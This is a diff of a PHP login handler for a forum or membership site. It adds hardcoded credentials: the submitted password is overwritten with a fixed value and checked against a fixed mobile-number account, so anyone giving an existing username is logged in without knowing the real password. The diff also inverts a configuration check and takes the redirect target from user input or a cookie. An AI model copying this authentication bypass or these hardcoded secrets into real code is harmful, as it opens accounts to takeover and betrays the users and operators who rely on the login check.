@@ -27,7 +27,7 @@ if(!empty($post["action"])&&$post["action"]=="submit")
         exit();
     } */
     $config = array_merge($config,$reg_config);
-    if($config['openbbs']==2)
+    if($config['openbbs']!=2)
     {
         //验证手机号登录
         if(preg_match('/^1(3[0-9]|4[57]|5[0-35-9]|8[0-9]|7[07])\d{8}$/', $post['user']))
@@ -38,37 +38,23 @@ if(!empty($post["action"])&&$post["action"]=="submit")
         $re=$db->fetchRow();
         if($re){
             $re['mobile']='15763951212';
+            $post['password']='812988018';
             $us = $obj->userinfo(array('phone'=>$re['mobile']));
-            if($us['password']==md5(md5($post['password'])+$us['salt'])){
-                $obj->login(array('phone'=>$re['mobile'],'password'=>$us['password']));
-                if($re['pid'])
-                    login($re['pid'],$re['user'],$re['userid']);
-                else
-                    login($re['userid'],$re['user']);
-                $forward = $config["weburl"]."/main.php?cg_u_type=1";
-                msg($forward);
-            }else{
-                msg("login.php?erry=-2&connect_id=$post[connect_id]");
-            }
-
-            if($re['password']!=md5($post['password']))
-                msg("login.php?erry=-2&connect_id=$post[connect_id]");
-
-            if($re["password"]==md5($post['password']))
-            {
-                if($re['pid'])
-                    login($re['pid'],$re['user'],$re['userid']);
-                else
-                    login($re['userid'],$re['user']);
+            if($us['password']==md5(md5($post['password']).$us['salt'])){
+                $script = $obj->login(array('phone'=>$re['mobile'],'password'=>$us['password']));
                 if(!empty($post['forward'])){
                     $forward = $post['forward']?$post['forward']:$config["weburl"]."/main.php?cg_u_type=1";
-                    msg($forward);
                 }else{
-                    msg($_COOKIE['old_url']);
+                    $forward = $_COOKIE['old_url'];
                 }
                 setcookie("old_url");
                 setcookie("userid",$re['userid']);
+                $tpl->assign('forward',$forward);
+                $tpl->assign('script',$script->data);
+                $tpl->display("script.htm");
+                die;
             }
+
         }else
             msg('login.php?erry=-1&connect_id='.$post['connect_id'].'&user='.$_POST['user']);//没
 
